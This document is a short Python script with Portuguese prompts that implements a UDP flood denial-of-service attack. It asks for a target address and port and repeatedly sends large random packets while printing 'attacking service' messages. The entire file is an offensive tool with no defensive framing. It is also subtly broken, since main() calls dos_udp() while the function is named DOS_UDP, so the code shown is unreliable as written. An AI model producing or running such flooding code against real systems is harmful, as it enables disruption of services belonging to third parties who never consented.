import socket
import os
from platform import platform, system
import random

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def DOS_UDP():
	ip = str(input("Alvo: "))
	port = int(input("Porta: "))
	packages = random._urandom(4092)
	contagem = 0

	while contagem <= 3000: 
		try: 
			s.sendto(packages, ((ip, port)))
			iphost = socket.gethostbyname(ip)
			print(f"Atacando Serviço => {iphost}")
			contagem += 1
		except Exception as error:
			print(f"Um erro ocorreu enquanto o programa estava rodando: {error}")



def main():
	while True:
		dos_udp()
		break
		
main()
